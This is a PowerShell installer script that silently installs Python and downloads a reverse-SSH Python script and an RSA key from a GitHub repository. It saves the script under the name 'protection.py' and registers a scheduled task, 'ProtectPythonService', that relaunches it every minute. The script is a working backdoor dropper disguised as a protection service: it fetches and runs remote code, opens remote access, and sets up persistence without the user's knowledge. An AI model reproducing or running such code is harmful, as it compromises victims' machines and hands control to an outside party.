# Search the python executable
$pythonPath = Get-Command python -ErrorAction SilentlyContinue

# If python executable is not found, install python
if (-not $pythonPath) {
    # Define the URL for the Python installer
    $installerUrl = "https://www.python.org/ftp/python/3.12.4/python-3.12.4-amd64.exe"
    
    # Define the path for the downloaded installer
    $installerPath = "$env:TEMP\python_installer.exe"

    # Download the Python installer
    Write-Output "Downloading Python installer..."
    Invoke-WebRequest -Uri $installerUrl -OutFile $installerPath

    # Install Python silently
    Write-Output "Installing Python..."
    Start-Process -FilePath $installerPath -ArgumentList "/quiet InstallAllUsers=1 PrependPath=1" -NoNewWindow -Wait

    # Verify installation
    $pythonPath = Get-Command python -ErrorAction SilentlyContinue
    if ($pythonPath) {
        Write-Output "[!] Python installed successfully."
    } else {
        Write-Output "[x] Python installation failed."
    }

    # Clean up
    Remove-Item -Path $installerPath -Force
} else {
    Write-Output "[!] Python is already installed."
}

# Fetch the python executable path
$pythonPath = [System.IO.Path]::GetDirectoryName($pythonPath.Source)
$pythonPath = "$pythonPath\python.exe"

######################################################## Here finish the python installation


# Download the python script directly with invoke-webrequest
$outDirectory = "$env:TEMP"		# Temp directory in Windows
Write-Output "[!] Temp directory: $outDirectory"

$repoUrl = "https://raw.githubusercontent.com/NeronNymus/protection/refs/heads/main/light/reverse_ssh_android2.py"
$requirementsUrl = "https://raw.githubusercontent.com/NeronNymus/protection/refs/heads/main/requirements.txt"
$contentUrl = "https://raw.githubusercontent.com/NeronNymus/protection/refs/heads/main/archenemy_rsa"
$scriptPath = "${outDirectory}/protection.py"
$requirementsPath = "${outDirectory}/requirements.txt"
$contentPath = "${outDirectory}/archenemy_rsa"

# Check if scriptPath already exists
if (Test-Path $scriptPath) {
    # If it exists, delete it
    Remove-Item $scriptPath -Force
    Write-Output "[!] File '$scriptPath' deleted."
}


# Try to make the web requests
try {
	# Download the repository and requirements
	Invoke-WebRequest -Uri $repoUrl -OutFile $scriptPath
	Invoke-WebRequest -Uri $requirementsUrl -OutFile $requirementsPath
	Invoke-WebRequest -Uri $contentUrl -OutFile $contentPath
    Write-Output "[!] Scripts downloaded successfully."

    # Install the Python packages from requirements.txt
    Write-Output "[!] Installing Python packages..."
    & python -m pip install --upgrade pip *> $null
    & python -m pip install -r $requirementsPath *> $null

    Write-Output "[!] Python packages installed successfully."

} catch {
    # Check if the file already exists
    if (Test-Path -Path $scriptPath) {
        Write-Output "[!] The file already exists at $scriptPath."
    } else {
        Write-Output "[!] The file $scriptPath does not exist and could not be downloaded."
    }
}

# Schedule Task for every startup
$TaskName = "ProtectPythonService"

# Check if the scheduled task exists
$scheduledTask = Get-ScheduledTask -TaskName $TaskName -ErrorAction SilentlyContinue

if ($scheduledTask) {
    Write-Output "[!] Task '$TaskName' exists. Deleting it now."
    
    # Delete the existing task
    Unregister-ScheduledTask -TaskName $TaskName -Confirm:$false
    
    Write-Output "[!] Task '$TaskName' has been deleted."
} else {
    Write-Output "[!] Task '$TaskName' does not exist or has already been deleted."
}


# Define the action
$action = New-ScheduledTaskAction -Execute $pythonPath -Argument "$scriptPath"

# Define triggers
$t1 = New-ScheduledTaskTrigger -Daily -At 12:45pm
$t2 = New-ScheduledTaskTrigger -Once -RepetitionInterval (New-TimeSpan -Minutes 1) -RepetitionDuration (New-TimeSpan -Hours 1) -At 12:45pm
$t1.Repetition = $t2.Repetition

# Register the task
Register-ScheduledTask -Action $action -Trigger $t1 -TaskName $TaskName -Force


# Call the downloaded script if exist
if (Test-Path -Path $scriptPath) {
	$scriptPathNoExtension = [System.IO.Path]::GetFileNameWithoutExtension($scriptPath)

    # Start the Python script in the background
    #Start-Process -FilePath "$pythonPath" -ArgumentList "$scriptPath" -WindowStyle Hidden -RedirectStandardOutput "NUL"
	#Start-Process -NoNewWindow "$pythonPath" "$scriptPath"
	Start-Process -NoNewWindow -FilePath "$pythonPath" -ArgumentList "`"$scriptPath`""
    #Start-Process -FilePath "$pythonPath" -ArgumentList "$scriptPath" -WindowStyle Hidden
    Write-Output "[*] Python script executed in the background!" 

	# Execute the script
	#& "$pythonPath" "$scriptPath" > $null 2>&1
	#echo "[*] Python Script executed!"
} else {
    Write-Output "[!] The script at $scriptPath does not exist. Cannot execute."
}
